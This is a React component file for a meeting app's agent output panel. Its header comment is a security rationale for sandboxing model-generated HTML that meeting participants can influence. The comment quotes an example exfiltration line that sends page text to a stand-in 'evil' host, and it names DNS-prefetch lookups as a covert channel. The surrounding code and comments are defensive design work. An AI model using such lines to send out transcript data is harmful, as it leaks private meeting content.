// One agent's live output panel.
//
// Three render modes, chosen by the agent's `widget_type`:
//   markdown — the note-taker's growing document, via MarkdownRenderer
//   html     — the sketch artist's self-contained widget, in a sandboxed iframe
//   chat     — a message thread the user drives directly
//
// The HTML mode is the one with a security posture worth stating, and it takes
// THREE controls, not one. The document is model-generated from meeting
// transcript — which anyone who speaks in the meeting can influence — so:
//
//   1. It renders inside a `srcDoc` iframe with `sandbox="allow-scripts"` and NO
//      `allow-same-origin`. That pair gives the frame a null origin, so its
//      scripts cannot reach this document, our cookies, or the gateway. It is
//      never injected into this page's DOM by any route.
//   2. That is necessary but NOT sufficient: a null origin blocks READING this
//      page, and does nothing about OUTBOUND requests — `fetch(…)` and
//      `new Image().src = 'https://evil/?d='+document.body.innerText` both work
//      fine from one. So the srcdoc is built by `buildSketchSrcdoc`, which
//      prepends a CSP that denies all egress (`connect-src 'none'`, `img-src`
//      with no `https:`) and pins scripts to the same-origin vendored Mermaid
//      file. The frame needs no network, so it is granted none.
//   3. Nor was the CSP sufficient on its own, because it must grant `script-src
//      'unsafe-inline'` for the Mermaid bootstrap. That let the MODEL's inline
//      script run too, and script can stream the transcript out through
//      `<link rel="dns-prefetch">` lookups that no CSP directive governs. So
//      `buildSketchSrcdoc` also strips the model's scripts, event handlers, and
//      speculative/navigational elements before serializing.
//
// The diagram still renders: Mermaid is driven by OUR bootstrap from the
// declarative `div.mermaid` markup the agent is instructed to emit, so removing
// the model's own JS costs the feature nothing. See ../lib/sketchSrcdoc.ts for
// each directive's rationale and the full vector list.
//
// The markdown mode is also EDITABLE — the minutes the user can correct. The panel
// only ever shows one copy: an edit takes precedence server-side, so `output` is
// already whatever should be on screen and there is no merge to do here. What this
// component owns is the draft (local, seeded when edit mode opens, so the 5-second
// outputs poll cannot type over the user) and the two states a reader has to be able
// to tell apart: that they are looking at their own text rather than the agent's, and
// that the agent has written more since. HTML and chat agents are not editable; see
// `EDITABLE_WIDGET_TYPE` in the backend constants for why.
//
// Any non-chat agent's panel can also be EXPANDED (#21179): the parent hides the
// transcript and the sibling panels (see AgentPanelSlot), and this card grows to fill the workspace,
// with the diagram frame and the notes pane taking the freed height. It is view
// state only. The same header button or Escape restores the compact layout, which
// stays the default, and focus returns to that button.

import { useEffect, useRef, useState } from 'react'
import {
  FileText,
  Maximize2,
  MessageSquare,
  Minimize2,
  Pencil,
  RotateCcw,
  Volume2,
  VolumeX,
} from 'lucide-react'

import { i18nT } from '../../../i18n/t'
import { useConfirm } from '../../../components/ConfirmDialog'
import ErrorNotice from '../../../components/ErrorNotice'
import MarkdownRenderer from '../../../components/MarkdownRenderer'
import { Btn, Card, CardTitle, Input, SendBtn } from '../../../components/ui'
import type { AgentDef, OutputEdit } from '../api'
import { buildSketchSrcdoc } from '../lib/sketchSrcdoc'
import { useImeGuard } from '../../../hooks/useImeGuard'
import { ESCAPE_PRIORITY, useEscapeLayer } from '../../../hooks/useEscapeLayer'
import { isModalLayer } from '../../../hooks/modalLayer'

interface Props {
  agent: AgentDef
  /** The EFFECTIVE output: the user's edit when one exists, otherwise the agent's. */
  output: string
  listening: boolean
  chatView: boolean
  /**
   * Set when the user has edited this agent's output. Its `content` is not carried —
   * `output` above is already the edited text.
   */
  edit?: OutputEdit
  /** True while a save or revert is in flight (for any panel). */
  editSaving?: boolean
  onToggleListening: () => void
  onToggleChatView: () => void
  onSendMessage: (text: string) => void
  /** Absent for an agent whose output is not editable (html widgets, chat agents). */
  onSaveOutput?: (content: string) => Promise<unknown>
  onRevertOutput?: () => Promise<unknown>
  /** This panel fills the meeting workspace instead of its grid cell. */
  expanded?: boolean
  /** Absent: no expand control (the panel cannot be enlarged here). */
  onToggleExpanded?: () => void
  /**
   * Told `true` while this panel holds a minutes draft that differs from its
   * seed, and `false` once it no longer does or the panel unmounts. The draft is
   * local state, so a parent that navigates away needs this to ask first.
   */
  onDirtyChange?: (dirty: boolean) => void
}

/**
 * Whose Escape is this? The expanded panel answers only a press that starts
 * inside its own card, or on the page body (nothing focused). Anything else
 * belongs to its own control: the meeting title's cancel, a menu, a dialog. An
 * IME composition is closing its candidate list and must yield outright.
 */
function escapeVerdictFor(e: KeyboardEvent, card: Element | null): 'take' | 'pass' | 'yield' {
  if (e.isComposing) return 'yield'
  const target = e.target instanceof Element ? e.target : null
  if (target === null || target === document.body || target === document.documentElement) return 'take'
  if (card === null || !card.contains(target)) return 'pass'
  for (let el: Element | null = target; el && el !== card; el = el.parentElement) {
    if (isModalLayer(el)) return 'yield'
  }
  return 'take'
}

export default function AgentPanel({
  agent,
  output,
  listening,
  chatView,
  edit,
  editSaving = false,
  onToggleListening,
  onToggleChatView,
  onSendMessage,
  onSaveOutput,
  onRevertOutput,
  expanded = false,
  onToggleExpanded,
  onDirtyChange,
}: Props) {
  const ime = useImeGuard()
  const { confirm, confirmDialog } = useConfirm()
  const inputRef = useRef<HTMLInputElement>(null)
  const [sent, setSent] = useState<string[]>([])
  // `null` means "not editing". One piece of state carrying both the text and
  // the seed it was opened from, so the pieces can never disagree about whether
  // there is a draft or what it started as.
  //
  // Seeded when edit mode OPENS and never from a poll, which is what makes the
  // outputs query safe to keep refetching underneath: a 5-second poll landing
  // mid-sentence cannot overwrite what the user is typing. The seed is why the
  // dirty check below survives that same poll — comparing against the live
  // `output` prop would call an untouched draft dirty the moment the agent
  // writes more.
  //
  // `unsettled` marks a draft whose last save rejected. A rejection does not say
  // what the server holds (the write may have landed before the refresh after it
  // failed), so the seed no longer proves the text is saved, and the draft stays
  // dirty until a later save resolves.
  const [draft, setDraft] = useState<{ seed: string; text: string; unsettled?: boolean } | null>(
    null,
  )
  const isChatAgent = agent.widget_type === 'chat'
  const showChat = chatView || isChatAgent
  const editable = onSaveOutput != null && !showChat
  const editing = draft !== null
  // THIS panel's save, distinct from the `editSaving` prop: that prop is
  // session-wide (any panel's save or revert), which is right for disabling the
  // controls but wrong for the button label — an idle panel must not read
  // "Saving…" because a sibling agent's write is in flight.
  const [savePending, setSavePending] = useState(false)
  // Same dirty rule as `cancelEdit`: against the seed, never the live output.
  // A draft whose save is still in flight also counts: until the request lands,
  // the seed does not yet say what the server holds. A draft whose save rejected
  // counts for the same reason.
  const dirty =
    draft !== null && (savePending || draft.unsettled === true || draft.text !== draft.seed)
  useEffect(() => {
    if (!dirty || onDirtyChange == null) return
    onDirtyChange(true)
    return () => onDirtyChange(false)
  }, [dirty, onDirtyChange])
  // The session hook's toast fades; a save or revert that did not land is a state
  // this panel must keep showing until the next attempt.
  const [outputError, setOutputError] = useState<string | null>(null)

  const expandRef = useRef<HTMLButtonElement>(null)
  const canExpand = onToggleExpanded != null && !isChatAgent
  // Restoring must land the keyboard on the control that expanded the panel,
  // whichever way the restore came (the button itself, or Escape from inside the
  // enlarged notes). Keyed to the true -> false edge, never to mount.
  const wasExpanded = useRef(expanded)
  useEffect(() => {
    if (wasExpanded.current && !expanded) expandRef.current?.focus()
    wasExpanded.current = expanded
  }, [expanded])
  useEscapeLayer(
    expanded && onToggleExpanded != null,
    e => {
      const verdict = escapeVerdictFor(e, expandRef.current?.closest('[data-agent-panel]') ?? null)
      if (verdict === 'take') onToggleExpanded?.()
      return verdict
    },
    ESCAPE_PRIORITY.flyout,
  )
  // Grid cell by default; the whole workspace height while expanded.
  const cardClass = `col-span-2 flex flex-col gap-2${expanded ? ' flex-1 min-h-min' : ''}`

  const saveDraft = async () => {
    if (draft === null || onSaveOutput == null) return
    const submittedDraft = draft.text
    setOutputError(null)
    setSavePending(true)
    try {
      await onSaveOutput(submittedDraft)
    } catch {
      // The session hook reports the transport error. Keep the draft open: closing
      // here would turn a failed save into permanent loss of the user's correction.
      setOutputError(i18nT('apps.meetings.session.minutesSaveFailed'))
      setDraft(current => (current === null ? current : { ...current, unsettled: true }))
      return
    } finally {
      setSavePending(false)
    }
    // Saving is asynchronous but the textarea remains editable. Only close the
    // exact snapshot the request persisted; text typed while it was in flight is
    // still a local draft and must stay on screen. Its seed moves to the text
    // the server now holds, so an edit back to the old seed still reads dirty.
    setDraft(current => {
      if (current === null || current.text === submittedDraft) return null
      return { seed: submittedDraft, text: current.text }
    })
  }

  const requestRevert = async () => {
    if (onRevertOutput == null) return
    const confirmed = await confirm({
      title: i18nT('apps.meetings.agentPanel.revert'),
      body: i18nT('apps.meetings.agentPanel.revertHint', { name: agent.name }),
      confirmLabel: i18nT('apps.meetings.agentPanel.revert'),
    })
    if (!confirmed) return
    setOutputError(null)
    try {
      await onRevertOutput()
    } catch {
      setOutputError(i18nT('apps.meetings.session.minutesRevertFailed'))
    }
  }

  const cancelEdit = async () => {
    // A dirty draft is unsaved work; discarding it silently is the same loss the
    // revert path already confirms, so it gets the same dialog. A clean draft
    // (nothing typed, or typed back to the seed) closes without asking. The
    // comparison is against the SEED the editor opened with, never the live
    // `output` prop: the outputs poll refreshes that prop while the editor is
    // open, and an untouched draft must not read as dirty because the agent
    // wrote more underneath. A draft whose save rejected also asks, whatever
    // its text: the seed no longer says what the server holds.
    if (draft !== null && (draft.unsettled === true || draft.text !== draft.seed)) {
      const confirmed = await confirm({
        title: i18nT('apps.meetings.agentPanel.discardDraft'),
        body: i18nT('apps.meetings.agentPanel.discardDraftHint'),
        confirmLabel: i18nT('apps.meetings.agentPanel.discardDraft'),
      })
      if (!confirmed) return
    }
    setDraft(null)
  }

  const send = () => {
    const text = inputRef.current?.value.trim()
    if (!text) return
    onSendMessage(text)
    setSent(prev => [...prev, text])
    if (inputRef.current) inputRef.current.value = ''
  }

  const header = (
    <div className="flex items-center justify-between gap-2">
      <div className="flex items-center gap-2 min-w-0">
        <CardTitle>{agent.name}</CardTitle>
        {/* Beside the title, apart from the right-hand view controls: it acts on
            the panel's size, not on what the panel shows or hears. */}
        {canExpand && (
          <Btn
            ref={expandRef}
            onClick={onToggleExpanded}
            aria-label={
              expanded
                ? i18nT('apps.meetings.agentPanel.collapse', { name: agent.name })
                : i18nT('apps.meetings.agentPanel.expand', { name: agent.name })
            }
            title={
              expanded
                ? i18nT('apps.meetings.agentPanel.collapse', { name: agent.name })
                : i18nT('apps.meetings.agentPanel.expand', { name: agent.name })
            }
          >
            {expanded ? (
              <Minimize2 className="lucide-inline" />
            ) : (
              <Maximize2 className="lucide-inline" />
            )}
          </Btn>
        )}
        {/* Which copy is on screen is the first thing to know about an edited panel,
            so it is stated next to the name rather than hidden in a tooltip. */}
        {edit && !editing && (
          <span className="flex-none px-1.5 py-0.5 rounded text-[11px] bg-accent/15 border border-accent/20 text-text">
            {i18nT('apps.meetings.agentPanel.edited')}
          </span>
        )}
      </div>
      <div className="flex items-center gap-1">
        {/* Hidden while editing: switching to the chat view would unmount the
            textarea and take the draft with it, silently. */}
        {!isChatAgent && !editing && (
          <Btn
            onClick={onToggleChatView}
            aria-label={
              chatView
                ? i18nT('apps.meetings.agentPanel.showOutput')
                : i18nT('apps.meetings.agentPanel.showChat')
            }
            title={
              chatView
                ? i18nT('apps.meetings.agentPanel.showOutput')
                : i18nT('apps.meetings.agentPanel.showChat')
            }
          >
            {chatView ? (
              <FileText className="lucide-inline" />
            ) : (
              <MessageSquare className="lucide-inline" />
            )}
          </Btn>
        )}
        <Btn
          onClick={onToggleListening}
          aria-label={
            listening
              ? i18nT('apps.meetings.agentPanel.mute', { name: agent.name })
              : i18nT('apps.meetings.agentPanel.unmute', { name: agent.name })
          }
          title={
            listening
              ? i18nT('apps.meetings.agentPanel.listeningHint')
              : i18nT('apps.meetings.agentPanel.mutedHint')
          }
        >
          {listening ? (
            <Volume2 className="lucide-inline" />
          ) : (
            <VolumeX className="lucide-inline" />
          )}
        </Btn>
      </div>
    </div>
  )

  if (showChat) {
    return (
      <Card className={cardClass} data-agent-panel={agent.id}>
        {header}
        {/* A revert that rejects after the user switched to the chat view must still
            say so here. No hand-off: the message input below holds unsent text. */}
        <ErrorNotice message={outputError} />
        {/* Expanded, the cap gives way to the card's height; size containment keeps
            the thread's length out of the card's `min-h-min` floor (as for the notes
            pane), so a long thread scrolls here and the input stays on screen. */}
        <div className={`flex-1 min-h-[120px] ${expanded ? 'contain-size ' : 'max-h-[320px] '}overflow-y-auto flex flex-col gap-2`}>
          {sent.length === 0 ? (
            <p className="text-[13px] text-muted">
              {i18nT('apps.meetings.agentPanel.chatEmpty', { name: agent.name })}
            </p>
          ) : (
            sent.map((message, index) => (
              <div
                key={`${index}-${message.slice(0, 12)}`}
                className="self-end max-w-[85%] px-3 py-1.5 rounded-2xl rounded-br-sm bg-accent/15 border border-accent/20 text-[13px] text-text break-words"
              >
                {message}
              </div>
            ))
          )}
        </div>
        <div className="flex items-center gap-2 pt-2 border-t border-border">
          <Input
            ref={inputRef}
            type="text"
            className="flex-1"
            placeholder={i18nT('apps.meetings.agentPanel.messagePlaceholder', {
              name: agent.name,
            })}
            aria-label={i18nT('apps.meetings.agentPanel.messagePlaceholder', {
              name: agent.name,
            })}
            {...ime.bindEnter({ onEnter: send })}
          />
          <SendBtn onClick={send} aria-label={i18nT('apps.meetings.agentPanel.send')}>
            {i18nT('apps.meetings.agentPanel.send')}
          </SendBtn>
        </div>
      </Card>
    )
  }

  if (agent.widget_type === 'html') {
    return (
      <Card className={cardClass} data-agent-panel={agent.id}>
        {header}
        {output ? (
          <iframe
            title={i18nT('apps.meetings.agentPanel.diagramFrameTitle', { name: agent.name })}
            // buildSketchSrcdoc strips the model's scripts/handlers, then wraps
            // what is left in a CSP that denies all network egress and pins
            // scripts to our vendored same-origin Mermaid.
            // `window.location.origin` is required (not a bare path): the frame is
            // null-origin, so a relative /vendor/... URL would not resolve and the
            // CSP cannot use 'self'. Guarded for a non-browser test/SSR context —
            // '' pins a path-only source that matches nothing, i.e. fails CLOSED.
            srcDoc={buildSketchSrcdoc(
              output,
              typeof window === 'undefined' ? '' : window.location.origin,
            )}
            // Null-origin sandbox: scripts may run inside the frame (OUR Mermaid
            // bootstrap needs to) but WITHOUT same-origin, so nothing in the frame
            // can reach this page, its cookies, or the gateway. This is the HARD
            // boundary; the CSP above is the egress control the sandbox lacks.
            sandbox="allow-scripts"
            className={`w-full border border-border rounded-md bg-white${expanded ? ' flex-1 min-h-0' : ''}`}
            // The transform is the same compositing promotion every sandbox-doc
            // frame carries: a laid-out document whose first paint is skipped
            // shows an empty box (silent — correct height, no error state), and
            // promoting the frame to its own layer is the remedy that needs no
            // post-load timing. This frame builds its document inline (srcDoc,
            // outside the sandbox-doc mint), so it was left out when the mint's
            // consumers were promoted.
            //
            // Expanded, the fixed height gives way to `flex-1` so the frame takes
            // the card's freed height; 340 px stays the floor.
            style={
              expanded
                ? { minHeight: 340, transform: 'translateZ(0)' }
                : { minHeight: 340, height: 340, transform: 'translateZ(0)' }
            }
          />
        ) : (
          <p className="text-[13px] text-muted">
            {i18nT('apps.meetings.agentPanel.awaitingOutput', { name: agent.name })}
          </p>
        )}
      </Card>
    )
  }

  if (editing) {
    return (
      <Card className={cardClass} data-agent-panel={agent.id}>
        {header}
        <textarea
          value={draft.text}
          onChange={e =>
            setDraft(current =>
              current === null ? current : { ...current, text: e.target.value },
            )
          }
          // The Edit button unmounts with the read view when edit mode opens, so
          // without this the browser drops focus to <body> and a keyboard user
          // has to tab back into the editor they just asked for.
          autoFocus
          // Distinct from the card's title on purpose: the region and the control are
          // different things, and giving both the same accessible name makes them
          // indistinguishable to a screen reader.
          aria-label={i18nT('apps.meetings.agentPanel.editorLabel', { name: agent.name })}
          spellCheck
          className={`min-h-[280px] ${expanded ? 'flex-1 resize-none' : 'max-h-[520px] resize-y'} bg-transparent border border-border rounded-md outline-hidden p-3 text-[13px] leading-relaxed text-text font-body focus-ring`}
        />
        {/* No hand-off: the minutes draft in the textarea above is unsaved. */}
        <ErrorNotice message={outputError} />
        <div className="flex items-center justify-end gap-2">
          <Btn onClick={() => void cancelEdit()} disabled={editSaving}>
            {i18nT('apps.meetings.agentPanel.cancel')}
          </Btn>
          <SendBtn
            onClick={saveDraft}
            disabled={editSaving}
          >
            {savePending
              ? i18nT('apps.meetings.agentPanel.saving')
              : i18nT('apps.meetings.agentPanel.save')}
          </SendBtn>
        </div>
        {confirmDialog}
      </Card>
    )
  }

  return (
    <Card className={cardClass} data-agent-panel={agent.id}>
      {header}
      {/* No hand-off: this panel's message-to-agent input holds unsent text. */}
      <ErrorNotice message={outputError} />
      {(editable || (edit && onRevertOutput)) && (
        <div className="flex flex-wrap items-center justify-end gap-2 pt-2 border-t border-border">
          {editable && (
            <Btn
              onClick={() => setDraft({ seed: output, text: output })}
              aria-label={i18nT('apps.meetings.agentPanel.edit')}
            >
              <Pencil className="lucide-inline" />
              {i18nT('apps.meetings.agentPanel.edit')}
            </Btn>
          )}
          {edit && onRevertOutput && (
            <Btn
              danger
              onClick={() => void requestRevert()}
              disabled={editSaving}
              aria-label={i18nT('apps.meetings.agentPanel.revert')}
              title={i18nT('apps.meetings.agentPanel.revertHint', { name: agent.name })}
            >
              <RotateCcw className="lucide-inline" />
              {i18nT('apps.meetings.agentPanel.revert')}
            </Btn>
          )}
        </div>
      )}
      {/* The honest half of the sidecar bargain. The edit keeps winning — that is the
          feature — so a panel whose agent has moved on must SAY so, or it looks like
          the agent simply stopped writing. */}
      {edit?.stale && (
        <p className="flex-none text-[12px] text-muted">
          {i18nT('apps.meetings.agentPanel.staleEdit', { name: agent.name })}
        </p>
      )}
      {/* The scroller must live INSIDE the Card, never on it: Card prepends
          `card-glow`, whose `overflow:hidden` (declared after @tailwind utilities
          in index.css) beats an `overflow-y-auto` utility on the same element —
          equal specificity, later source order wins, and twMerge cannot resolve a
          conflict with a hand-written class. Scrolling on an inner div mirrors how
          the in-panel chat scrolls (#7664). */}
      <div
        data-testid="agent-output-pane"
        // 60svh keeps the pane shorter than the column that scrolls it on a
        // phone (the workspace gives this column ~380px there), so touch
        // scrolling never traps inside a pane taller than its container.
        // `vh` stays as the fallback, same idiom as AgentsPage.
        //
        // Expanded, the cap gives way to the card's own height. Size containment
        // keeps the notes' length out of the card's `min-h-min` floor, so long
        // notes scroll here instead of stretching the card past the workspace.
        className={
          expanded
            ? 'flex-1 min-h-0 contain-size overflow-y-auto'
            : 'max-h-[min(520px,60vh)] supports-[height:100svh]:max-h-[min(520px,60svh)] overflow-y-auto'
        }
      >
        {output ? (
          <MarkdownRenderer content={output} />
        ) : !edit ? (
          <p className="text-[13px] text-muted">
            {i18nT('apps.meetings.agentPanel.awaitingOutput', { name: agent.name })}
          </p>
        ) : /* A saved-but-empty edit is the user's own (blank) version: saying
               "output will appear here" would misreport their deliberate state
               as the agent not having written yet. The "Edited" badge above
               already says whose copy this is. */ null}
      </div>
      {confirmDialog}
    </Card>
  )
}
